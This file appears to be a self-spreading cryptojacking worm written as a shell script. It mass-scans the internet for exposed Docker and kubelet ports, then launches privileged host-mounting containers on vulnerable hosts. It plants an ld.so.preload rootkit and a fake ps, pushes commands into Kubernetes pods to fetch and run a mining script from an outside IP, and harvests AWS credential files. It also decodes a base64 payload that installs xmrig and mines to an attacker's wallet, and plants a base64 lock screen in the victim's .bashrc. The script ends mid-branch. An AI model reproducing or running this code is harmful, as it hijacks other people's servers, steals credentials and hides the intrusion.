#!/bin/sh
export LC_ALL=C
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}"
export HISTFILE=/dev/null 
unset HISTFILE
HISTSIZE=0


D_SOURCE="mangletmpuser/fcminer"
D_NAME="fcminer"
D_1_TIMEOUT="13"
D_2_TIMEOUT="120"




function init_main(){
cleanup
setuprou
cleanupdocker
/usr/bin/kernel
#lockdown
scanrand
}


function cleanup(){
cleanrou /host/root/.sh/xmrig
cleanrou root/.sh/xmrig
cleanrou /host/root/.ssh/xmrig
cleanrou /root/.ssh/xmrig

pkill xmrig

history -c 
}


function cleanupdocker(){
if type docker 2>/dev/null; then 
clean_docker webchain-miner
clean_docker xmrig
clean_docker xmr
fi
}

function setuprou(){
apk add --no-cache bash curl wget docker masscan go git aws-cli libpcap-dev e2fsprogs-extra
if [ ! -f "/usr/bin/zgrab" ]; then go get github.com/zmap/zgrab ; cd /root/go/src/github.com/zmap/zgrab ; go build; cp /root/go/src/github.com/zmap/zgrab/zgrab /usr/bin/zgrab && cd /root/ && rm -fr /root/go/; fi

if [ -d "/host/" ]; then
if [ -f "/host/etc/ld.so.preload" ] ; then chattr -ia /host/etc/ld.so.preload ; rm -fr /host/etc/ld.so.preload ; touch /host/etc/ld.so.preload; fi
if [ ! -d "/host/etc/" ]; then chattr -ia /host/ 2>/dev/null; mkdir -p /host/etc/ 2>/dev/null; fi
if [ ! -f "/host/etc/dockerd.so" ] ; then cp /root/dockerd.so /host/etc/dockerd.so; chattr +i /host/etc/dockerd.so; fi
if [ ! -f "/host/etc/php.so" ] ; then cp /root/dockerd.so /host/etc/php.so; chattr +i /host/etc/php.so; fi
if [ ! -f "/host/etc/ps.so" ] ; then cp /root/dockerd.so /host/etc/ps.so; chattr +i /host/etc/ps.so; fi

cat /host/etc/ld.so.preload | grep '/etc/dockerd.so' 2>/dev/null || echo '/etc/dockerd.so' >> /host/etc/ld.so.preload 2>/dev/null
cat /host/etc/ld.so.preload | grep '/etc/php.so' 2>/dev/null || echo '/etc/php.so' >> /host/etc/ld.so.preload 2>/dev/null
cat /host/etc/ld.so.preload | grep '/etc/ps.so' 2>/dev/null || echo '/etc/ps.so' >> /host/etc/ld.so.preload 2>/dev/null

if [ ! -f "/host/usr/sbin/ps" ] ; then cp /root/x_ps /host/usr/sbin/ps; chmod +x /host/usr/sbin/ps; chattr +i /host/usr/sbin/ps; fi
fi
}



function lockdown(){
export LOCKSCREEN='IyEvYmluL2Jhc2gKCnRyYXAgZWNobyAiUHV0IGl0IGluIHlvdXIgbW91dGghIE1pdCBTYWNrPyBNaXQgU2FjayEhISEiIFNJR0lOVCBTSUdURVJNIFNJR0hVUApleHBvcnQgTENfQUxMPUMKZXhwb3J0IFBBVEg9JFBBVEg6L2Jpbjovc2JpbjovdXNyL2JpbjovdXNyL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9sb2NhbC9zYmluOi91c3IvZ2FtZXM6L3Vzci9sb2NhbC9nYW1lcwpleHBvcnQgRkFMU0VfUEFTU1dEPSdZMnhsWVhJS1pXTm9ieUFuSnlBN0lHVmphRzhnSnljZ095QmxZMmh2SUNjbklEc2dDbU5oZENBOFBFVWlUeUpHQ2dvS0NpQWdJQ0FnSUNBZ0lDQWdiV1Z2ZHl3Z2JXVnZkeXdnYldWdmR5d2diV1Z2ZHdvZ0lDQUtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnTDF4Zkwxd0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDOWNJQ0F2SUc4Z2J5QmNDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDOHZYRndnWEg0b0tpbCtMd29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQmdJQ0JjTHlBZ0lGNGdMd29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0I4SUZ4OGZDQjhmQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JjSUNkOGZDQjhmQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWENrb0tTMG9LU2tLQ2dvZ0lDQWdJQ0FnSUNBZ1IyRnlabWxsYkdRZ2FYTWdkMkYwWTJocGJtY2dXVTlWSVNFaENrVlBSZ29LYzJ4bFpYQWdNallLWTJ4bFlYSUtaV05vYnlBbkp5QTdJR1ZqYUc4Z0p5Y2dPeUJsWTJodklDY25JRHNnQ21OaGRDQThQRVVpVHlKR0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQTdMRjhnSUNBZ0lDQWdJQ0FnSUNBc0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lGOTFVSDRpWWlBZ0lDQWdJQ0FnSUNCa0luVXNDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdaRkFuSUNBZ0ltSWdJQ0FnSUNBZ0xHUWlJQ0FpYndvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWkNJZ0lDQWdMQ0JnWWlBZ0lDQWdaQ0luSUNBZ0lDSmlDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lHeGRJRnNnSUNBZ0lpQmdiQ3dnSUdRaUlDQWdJQ0FnSUd4aUNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUU5c0lEOGdJQ0FnSUNJZ0lDSmlZQ0k5ZFc5eGJ5eGZJQ0FpYkFvZ0lDQWdJQ0FnSUNBZ0lDQWdMR1JDWWlBaVlpQWdJQ0FnSUNBZ0ltSXNJQ0FnSUdBaWZuNVVUMkoxY0N4ZkNpQWdJQ0FnSUNBZ0lDQWdMR1FpSUNoa1lpNWdJaUFnSUNBZ0lDQWdJQ0lpSUNBZ0lDQWlkR0pqTEY4Z1lINGlXWFYxTEY4S0lDQWdJQ0FnSUNBZ0xtUWlJR3hnVkNjZ0lDYzlJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUg0Z0lDQWdJR0FpSWxsMUxBb2dJQ0FnSUNBZ0xHUlBZQ0JuVUN3Z0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCZ2RTd2dJQ0JpTEY4Z0lDSmlOd29nSUNBZ0lDQmtQeWNnTEdRaUlHd3NJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdZQ0ppTEY4Z1lINWlJQ0FpTVFvZ0lDQWdMRGhwSnlCa2JDQWdJR0JzSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FzWjJkUlQxWWlMR1JpWjNFc0xsOGlJQ0JnYkNBZ2JHSUtJQ0FnTG1SbUp5QW9UeXdnSUNBZ0lpQWdJQ0FnSUNBZ0lDQWdJQ0FzWjJkUldTSitJQ0FzSUVCQVFFQkFaQ0ppWkg0Z0lHQmlJQ0l4Q2lBZ0xtUm1KeUFnSUdBaUlDQWdJQ0FnSUNBZ0lDQXRQVUJSWjNCUFdTSWlJQ0FnSUNBb1lpQWdRRUJBUUZBZ1pHSWdJQ0FnWUV4d0ltSXNDaUF1WkNnZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCZklDQWdJQ0FnSUNBZ0lDQWdJQ0FnSW10dklDSTlaRjhzVVdBZ0lDeGZJQ0FpSUNBaVlpd0tJRkZzSUNBZ0lDQWdJQ0FnTGlBZ0lDQWdJQ0FnSUdBaWNXOHNMbDhnSUNBZ0lDQWdJQ0FnSW5SUmJ5eGZZQ0lpWW04Z08zUmlMQ0FnSUNCZ0ltSXNDaWh4VVNBZ0lDQWdJQ0FnSUh4TUlDQWdJQ0FnSUNBZ0lDQitJbEZSVVdkbloyTXNYeTRzWkU5aVl5eHZjRzl2VHlBZ1lDSitmaUk3TGlBZ0lGOWZMRGNzQ21CeGNDQWdJQ0FnSUNBZ0lIUmNhVzhzWHlBZ0lDQWdJQ0FnSUNBZ1lINGlWRTlQWjJkUlZpSWlJaUlnSUNBZ0lDQWdJRjhzWkdjc1h5QTlVRWxSU0dsaUxnb2dZSEZ3SUNBZ0lDQWdJQ0JnVVZzaWRGRlJVVzhzWHlBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnTEhCc2UxRlBVQ0luSUNBZ04wRkdVbUFLSUNBZ1lDQWdJQ0FnSUNBZ0lHQjBZaUFnSnlJaWRGRlJVV2NzWHlBZ0lDQWdJQ0FnSUNBZ0lDQndJaUFpWWlBZ0lHQWdJQ0FnSUNBZ0xqc3RMbUJXYkNjS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FpV1dJZ0lDQWdJQ0JnSW5SUlQwOXZMRjlmSUNBZ0lGOHNaV1JpSUNBZ0lHQWdMbDlmSUNBZ0wyQXZKM3dnSUh4aU96MDdMbDlmQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCZ0luUlJVVkZQVDA5UFVDSWlJQ0FnSUNBZ0lDQmdJbHhSVmp0eFVVOWliMklpWUMwdVgyQmNYMzUrTFM1ZkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNJaUlpSWdJQ0FnTGw4Z0lDQWdJQ0FnSUM4Z0lDQjhJSHh2VUNKY1h5QWdJSDVjSUg1Y1h5QWdmbHdLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmdmaUpjYVdNc2NXZG5aR1JQVDFBaWZDQWdmQ0FnZmx3Z0lDQmdYQ0FnZmkwdVh3b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0xIRlFZQ0lpSW53aUlDQWdmQ0JnWENCZ095QWdJR0JjSUNBZ1lGd0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCZklDQWdJQ0FnSUNCZkxIQWlJQ0FnSUNCOElDQWdJSHdnSUNCZ1hHQTdJQ0FnSUh3Z0lDQWdmQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWlZbTl2TEM1ZlpGQWlJQ0FnSUNBZ0lHQmNYeUFnWUZ3Z0lDQWdZRng4SUNBZ1lGd2dJQ0E3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JnSWpkMFdYNG5JQ0FnSUNBZ0lDQWdJQ0FnWUZ3Z0lHQmNJQ0FnSUdCOFh5QWdJSHdLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmdmbHdnSUh3S1JVOUdDbk5zWldWd0lESXpDZ289JwpleHBvcnQgQ09WSUQxOV9MT0dPPSdaV05vYnlBaUlDQmZYeUFnWDE5Zlh5QWdYMTlmWHlBZ1gxOWZYeUFnWDE4Z1h5QWdYMTlmWHlBZ1gxOGdJRjlmSUNBZ1gxOGdYeUFnSUNBZ1gxOWZJQ0JmWHlBZ0lGOGdJRjhnSUY5ZklDQmZYMTlmSUNBZ1gxOGdJRjlmWHlBZ0lqc0taV05vYnlBaUlDOGdYMXdvWHlBZ1h5a29YeUFnWHlrb0lDQmZYeWtvSUNBb0lGd29YeUFnWHlrb0lDQXBMeUFnWENBb0lDQW9JRndnSUNBdklGOWZLUzhnSUZ3Z0x5QXBLQ0JjS0NBZ0tTZ2dJQ0FnWENBdklDQmNMeUJmSUZ3Z0lqc0taV05vYnlBaUx5QWdJQ0JjSUNrb0lDQWdJQ2tvSUNBZ0tTQmZLU0F2SUNBZ0lDOGdJQ2tvSUNBZ0tTZ29JQ0JQSUNrdklDQWdJQzhnSUNnZ0tGOWZLQ0FnVHlBcFhDQmNMeUF2SUNrb0lDQXBJRVFnS0NoZkx5QXZYRjlmSUNBcElqc0taV05vYnlBaVhGOHZYRjh2S0Y5ZktTQWdLRjlmS1NBb1gxOWZYeWxjWHlsZlh5a2dLRjlmS1NBb1gxOHBYRjlmTHlCY1h5bGZYeWtnSUNCY1gxOWZLVnhmWHk4Z0lGeGZYeThnS0Y5ZktTaGZYMTlmTHlBb1gxOHBLRjlmWHk4Z0lqc0taV05vYnlBaUlDQWdJQ0JmWDE5ZklDQmZYMTlmSUNCZlgxOWZJQ0JmSUNCZklDQmZYMTlmSUNCZlgxOWZJQ0FnSUY5ZklDQmZYMTlmSUNBZ0lGOWZYMThnSUY4Z0lGOGdJRjlmSUNBZ0lGOWZJQ0FnSUY4Z0lGOGdJQ0FnSUNBZ0lqc0taV05vYnlBaUlDQWdJQzhnWDE5ZktTZ2dJRjlmS1NnZ0lGOGdYQzhnS1NnZ1hDZ2dJRjlmS1NnZ0lGOGdYQ0FnS0NBZ0tTOGdYMTlmS1NBZ0tDQWdYMThwTHlBcEtDQmNLQ0FnS1NBZ0tDQWdLU0FnS0NCY0x5QXBJQ0FnSUNBZ0lqc0taV05vYnlBaUlDQWdJRnhmWDE4Z1hDQXBJRjhwSUNBcElDQWdMMXdnWEM4Z0x5QXBJRjhwSUNBcElDQWdMeUFnSUNrb0lGeGZYMThnWENBZ0lDa2dYeWtnS1NCY0x5QW9MeUFvWHk5Y0x5QW9YeTljSUNrZ0lDOGdJQ0FnSUNBZ0lqc0taV05vYnlBaUlDQWdJQ2hmWDE5Zkx5aGZYMTlmS1NoZlgxeGZLU0JjWDE4dklDaGZYMTlmS1NoZlgxeGZLU0FnS0Y5ZktTaGZYMTlmTHlBZ0tGOWZLU0FnWEY5ZlgxOHZYRjlmWDE4dlhGOWZYMTh2S0Y5Zkx5QWdJQ0FnSUNBZ0lqc0taV05vYnlBaUlDQWdJQ0FnSUNBZ0lDQmZYeUFnSUNBZ1gxOGdJQ0FnWDE5ZklDQmZYeUJmSUNCZlgxOWZJQ0JmWDE5ZklDQWdJRjlmWDE4Z0lDQmZYeUFnSUY4Z0lGOGdJRjlmSUY4Z0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lqc0taV05vYnlBaUlDQWdJQ0FnSUNBZ0lDZ2dJQ2tnSUNBdklDQmNJQ0F2SUY5ZktTZ2dJQzhnS1NnZ0lGOWZLU2dnSUNBZ1hDQWdLQ0FnSUNCY0lDOGdJRndnTHlBcEtDQmNLQ0FnS0NCY0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lqc0taV05vYnlBaUlDQWdJQ0FnSUNBZ0lDOGdLRjh2WENnZ0lFOGdLU2dnS0Y5ZklDQXBJQ0FvSUNBcElGOHBJQ0FwSUVRZ0tDQWdJQ2tnUkNBb0tDQWdUeUFwWENBdlhDQXZMeUFnSUNBdklDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lqc0taV05vYnlBaUlDQWdJQ0FnSUNBZ0lGeGZYMTlmTHlCY1gxOHZJQ0JjWDE5ZktTaGZYMXhmS1NoZlgxOWZLU2hmWDE5Zkx5QWdLRjlmWDE4dklGeGZYeThnS0Y4dlhGOHBYRjhwWDE4cElDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lqc0snCmV4cG9ydCBDQU1QQUlHTkxPR089J1kyeGxZWElnT3lCbFkyaHZJQ2NuQ21OaGRDQThQRVVpVHlKR0Nnb0pJQ0FnSUNCVWFHVWdUVVZQVDFjZ0tuTmphRzUxY25JcUlFMUZUMDlQVnlBS0NTQWdJQ0FnSUNBZ0lDQWdJQ0JEY25sd2RHOXFZV05yYVc1bkxVTmhiWEJoYVdkdUNna2dJQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDOWNYeTljQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEMG9JTUt3ZDhLd0lDazlDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0tTQWdJQ2dnSUM4dkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FvWDE4Z1gxOHBMeThLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnYzNSdmNDQjNhR2x1YVc1bklHRnVaQ0JvYjNkc2FXNW5JU0FLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdhWFFuY3lCbWIzSWdZU0JuYjI5a0lHTmhkWE5sSVFvS0lDQWdJR2xtSUhsdmRTQmhZblZ6WldRZ2RHaHBjeUJqWVcxd1lXbG5iaUJ2Y2lCemRHOXdJSFJvWlNCdGFXNWxjaXdnQ2lBZ0lHRWdaM0psWVhRZ2JXRnVlU0IyWlhKNUlITnRZV3hzSUd0cGRIUmxibk1nZDJsc2JDQm9ZWFpsSUhSdklHUnBaU0VnQ2lBZ0lDQWdJQ0FnWVc1a0lHSmxaWElnYVhNZ01UQWdkR2x0WlhNZ2JXOXlaU0JsZUhCbGJuTnBkbVVoQ2dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUM0dUxpQk9RVTFCVTFSRklDNHVMZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FxSUNBZ1h5QmZJRjhnSUNBcUNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQXVMaUFnUjFSQ0lDQXVMZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnQ2tWUFJncGxZMmh2SUNjbklEc2daV05vYnlBbkp3cHpiR1ZsY0NBMkNnPT0nClBBU1NXT1JEX1dST05HPTEKZXhwb3J0IFBXREhBU0g9IjFjZGJiNzMyYjVmYjIwYzNjMjY5NzFmNzU4ZjgzY2RkIgoKY2xlYXIgOyBlY2hvICcnIDsgZWNobyAnJyA7IGVjaG8gJENBTVBBSUdOTE9HTyB8IGJhc2U2NCAtZCB8IGJhc2ggOyBjbGVhcgplY2hvICcnIDsgZWNobyAnJyA7IGVjaG8gJENPVklEMTlfTE9HTyB8IGJhc2U2NCAtZCB8IGJhc2ggOyBzbGVlcCA5CgpmdW5jdGlvbiBBU0tBUEFTUygpewpjbGVhcgp3aGlsZSBbICRQQVNTV09SRF9XUk9ORyAtZXEgMSBdCiBkbwoJZWNobyAnJyA7IGVjaG8gJycKICAgIGVjaG8gIlBhc3N3b3JkOiIKICAgIHJlYWQgLXMgRU5URVJFRF9QQVNTV09SRAogICAgUFdESU5QVVRIQVNIPWBlY2hvICRFTlRFUkVEX1BBU1NXT1JEIHwgbWQ1c3VtIHwgYXdrICd7cHJpbnQgJDF9J2AKCmlmIFtbICIkUFdESU5QVVRIQVNIIiA9ICoiJFBXREhBU0giKiBdXTt0aGVuCmVjaG8gIkFjY2VzcyBHcmFudGVkIgpQQVNTV09SRF9XUk9ORz0wCmVsc2UKZWNobyAtZSAiXGVbMTszMzs0MW0gQWNjZXNzIERlbmllbmQ6IEluY29ycmVuY3QgcGFzc3dvcmQhLiBUcnkgYWdhaW4gXDAzM1swbSI7CnNsZWVwIDMKZWNobyAkRkFMU0VfUEFTU1dEIHwgYmFzZTY0IC1kIHwgYmFzaApmaQpkb25lCn0KQVNLQVBBU1MKCmV4aXQKCg=='
export BASHRCLOCK='dHJhcCAnJyAyCn4vLmNvbmZpZy5mY20KdHJhcCAyCg=='


if [ ! -f "~/.config.fcm" ]; then chattr -ia ~/ 2>/dev/null ; echo $LOCKSCREEN | base64 -d > ~/.config.fcm 2>/dev/null ; chmod +x  ~/.config.fcm 2>/dev/null ; chattr +i ~/.config.fcm 2>/dev/null ; fi

if [ ! -f "~/.bashrc" ]; then chattr -ia ~/; chmod 1777 ~/ -R; touch ~/.bashrc; fi

cat ~/.bashrc 2>/dev/null | grep '~/.config.fcm' 2>/dev/null || chattr -ia ~/.bashrc 2>/dev/null; echo $BASHRCLOCK | base64 -d >> ~/.bashrc 2>/dev/null; chattr +i ~/.bashrc 2>/dev/null



unset LOCKSCREEN
}


function scanrand(){
while true; do 
if [ -f "/tmp/.results" ]; then rm -f /tmp/.results; fi
RAND_ONE=$(echo $(($RANDOM%255+1)))
RAND_SEC=$(echo $(($RANDOM%255+1)))
RANGE_TO_SCAN=$RAND_ONE"."$RAND_SEC".0.0/16"
masscan $RANGE_TO_SCAN -p2375,2376,2377,4244,4243,10250 --rate=100000 >> /tmp/.results

cleanres
pwnres

unset RAND_ONE
unset RAND_SEC
unset RANGE_TO_SCAN
done
}


function cleanres(){
cat /tmp/.results | grep 'Discovered open port 2375/tcp' | awk '{print $6}' >> /tmp/.d.2375
cat /tmp/.results | grep 'Discovered open port 2376/tcp' | awk '{print $6}' >> /tmp/.d.2376
cat /tmp/.results | grep 'Discovered open port 2377/tcp' | awk '{print $6}' >> /tmp/.d.2377
cat /tmp/.results | grep 'Discovered open port 4244/tcp' | awk '{print $6}' >> /tmp/.d.4244
cat /tmp/.results | grep 'Discovered open port 4243/tcp' | awk '{print $6}' >> /tmp/.d.4243
cat /tmp/.results | grep 'Discovered open port 10250/tcp' | awk '{print $6}' >> /tmp/.res.kube
rm -f /tmp/.results
find /tmp/ -size 0 -exec rm -f {} \;
history -c
}

function pwndres(){
TARGET_PORT=$1
if [ -f /tmp/.d.$TARGET_PORT ]; then
while read TARGET; do
pwn_docker $TARGET $TARGET_PORT
done < /tmp/.d.$TARGET_PORT
rm -f /tmp/.d.$TARGET_PORT
fi
}


function pwnkube(){
T1OUT="120"
TEMPFILE="/tmp/"$RANDOM$RANDOM$RANDOM
theip=$1
timeout -s SIGKILL 20 curl -sk https://$theip:10250/runningpods/ 2>/dev/null 1>/dev/null
RESULTCHECK=$?

if [ "$RESULTCHECK" = "0" ];then

timeout -s SIGKILL $T1OUT curl -sk https://$theip:10250/runningpods/ | jq . | grep 'namespace'
if [ -f $TEMPFILE ]; then rm -f $TEMPFILE; fi
timeout -s SIGKILL $T1OUT curl -sLk https://$theip:10250/runningpods/ | jq -r '.items[] | .metadata.namespace + " " + .metadata.name + " " + .spec.containers[].name' >> $TEMPFILE

while read namespace podname containername; do #echo ''; echo -e "\e[1;33;41m"$namespace" "$podname" "$containername"\033[0m"; echo ' '
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt update --fix-missing" && echo ' '
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk update" && echo ' '

timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y bash" && echo ' '
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y wget" && echo ' '
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y curl" && echo ' '

timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y bash" && echo ' '
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y wget" && echo ' '
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y curl" && echo ' '

timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add bash" && echo ' '
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add wget" && echo ' '
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add curl" && echo ' '

timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="mkdir -p /tmp/" && echo ' '
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="mkdir -p /var/tmp/" && echo ' '

timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="wget http://45.9.148.35/chimaera/sh/setup_xmr.sh -O /tmp/.x1mr" && echo ' '
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="curl http://45.9.148.35/chimaera/sh/setup_xmr.sh -o /tmp/.x2mr" && echo ' '
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x1mr" && echo ' '
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x2mr" && echo ' '
done < $TEMPFILE ; fi ; rm -f $TEMPFILE ; if [ -f "/tmp/.res.kube" ]; then rm -f /tmp/.res.kube; fi
}





function pwnres(){
if [ -f "/tmp/.d.2375" ];then pwndres 2375; fi
if [ -f "/tmp/.d.2376" ];then pwndres 2376; fi
if [ -f "/tmp/.d.2377" ];then pwndres 2377; fi
if [ -f "/tmp/.d.4244" ];then pwndres 4244; fi
if [ -f "/tmp/.d.4243" ];then pwndres 4243; fi

if [ -f "/tmp/.res.kube" ];then pwnkube; fi
}


function pwn_docker(){
TARGET_IP=$1
TARGET_PORT=$2
if [ -z "$TARGET_PORT" ]; then export TARGET_PORT=2375; fi
TMP_FILE="/tmp/"$RANDOM$RANDOM

timeout -s SIGKILL 13 docker -H $TARGET_IP:$TARGET_PORT info  > $TMP_FILE
HE_SAY=$?
echo $HE_SAY
if [ "$HE_SAY" = "0" ]; then OSTYPE=`cat $TMP_FILE | grep OSType | awk '{print $2}'`
rm -f $TMP_FILE
if [ "$OSTYPE" = "linux" ] ; then timeout -s SIGKILL $D_TIMEOUT docker -H $TARGET_IP:$TARGET_PORT run -d --net host --restart always --privileged --name $D_NAME -v /:/host $DOCKER_SOURCE &
else rm -f $TMP_FILE ; fi
fi
}















function aws_pwner(){
if [ -f "/host/root/.aws/credentials" ]; then 
AWS_ACCESS=`cat /host/root/.aws/credentials | grep 'aws_access_key_id' | awk '{print $3}' | head -n 1`
if [ ! -z "$AWS_ACCESS" ]; then
AWS_SECRET=`cat /host/root/.aws/credentials | grep 'aws_secret_access_key' | awk '{print $3}' | head -n 1`
if [ ! -z "$AWS_SECRET" ]; then

echo $AWS_PWN_SCRIPT | base64 -d | bash

fi
fi
fi
}


function aws_pwn_script(){


curl --upload-file /root/x_ps https://filepush.co/upload/ >> upload.txt ; export XMR_UP=$(cat upload.txt) && rm -f upload.txt
if [ -z "$XMR_UP" ]; then 
curl --upload-file /root/x_ps https://transfer.sh >> upload.txt ; export XMR_UP=$(cat upload.txt) && rm -f upload.txt; fi

if [ ! -z "$XMR_UP" ]; then echo "up works" ; 

fi



if [ -z "$XMR_UP" ]; then echo "up not works" ; echo IyEvYmluL2Jhc2gKaWYgISB0eXBlIHdnZXQgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHRoZW4gaWYgdHlwZSBhcHQtZ2V0IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyB0aGVuIGFwdC1nZXQgdXBkYXRlIC0tZml4LW1pc3NpbmcgMj4vZGV2L251bGwgMT4vZGV2L251bGwgOyBhcHQtZ2V0IGluc3RhbGwgLXkgd2dldCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbCA7IGFwdC1nZXQgaW5zdGFsbCAteSAtLXJlaW5zdGFsbCB3Z2V0IDI+L2Rldi9udWxsIDE+L2Rldi9udWxsIDsgZmkgOyBpZiB0eXBlIHl1bSAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgdGhlbiB5dW0gY2xlYW4gYWxsIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsIDsgeXVtIGluc3RhbGwgLXkgd2dldCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbCA7IHl1bSByZWluc3RhbGwgLXkgd2dldCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbCA7IGZpIDsgaWYgdHlwZSBhcGsgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHRoZW4gYXBrIHVwZGF0ZSAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbCA7IGFwayBhZGQgd2dldCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbCA7IGZpIDsgZmkKd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIGh0dHBzOi8vZ2l0aHViLmNvbS94bXJpZy94bXJpZy9yZWxlYXNlcy9kb3dubG9hZC92Ni44LjEveG1yaWctNi44LjEtbGludXgtc3RhdGljLXg2NC50YXIuZ3ogLU8gL3RtcC94bXIudGFyLmd6CnRhciB4dmYgL3RtcC94bXIudGFyLmd6IC1DIC90bXAvIC0tc3RyaXA9MQpjaG1vZCAreCAvdG1wL3htcmlnCi90bXAveG1yaWcgLW8gOTQuMTMwLjEyLjI3OjMzMzMgLS1kb25hdGUtbGV2ZWw9MSAtLWNvaW49bW9uZXJvIC11IDQ2RVBGenZuWDVHSDYxZWprUHBOY1JObThrVmpzOG9IUzlWd0NrS1JDckpYMjdYRVcyeTFOUExmU2E1NERHSHhxbktmekRVVlcxanpCZmVrazNockNWQ21BVXJGZDNIIC1wIEZDbWluZXIgLUIKaGlzdG9yeSAtYwpjbGVhcgo= | base64 -d > /tmp/payload.dat; fi







if [ "$(whoami)" = "root" ]; then echo "root"

elif [ "$(whoami)" != "root" ]; then echo "no root" 

